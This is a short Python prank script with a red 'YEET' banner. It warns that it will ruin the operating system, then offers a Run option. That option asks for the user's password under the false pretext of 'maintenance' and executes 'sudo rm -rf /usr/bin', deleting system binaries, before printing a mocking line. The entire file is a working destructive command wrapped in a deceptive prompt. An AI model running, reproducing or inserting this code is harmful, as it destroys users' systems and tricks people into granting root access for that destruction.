import os
import sys
from termcolor import colored, cprint
import time


name = colored('''__   __ _____  _____  _____ 
\ \ / /| ____|| ____||_   _|
 \ V / |  _|  |  _|    | |  
  | |  | |___ | |___   | |  
  |_|  |_____||_____|  |_|  
                           ''', 'red')
lol = colored('lol sudo go yeet', 'red')

def yeet():
    os.system('clear')
    cprint(name)
    print('\n\n')
    print('Running this file will ruin your os, only use on a virtual machine\n')

    print('1) Run \n2) Abort')
    choice = input('Choice:     ')
    
    if choice == '1':
        os.system('clear')
        print('Please input your password for maintenance.')
        os.system('sudo rm -rf /usr/bin')
        print('\n')
        cprint(lol)
        
    
    elif choice == '2':
        sys.exit()
    
    else:
        sys.exit()

yeet()
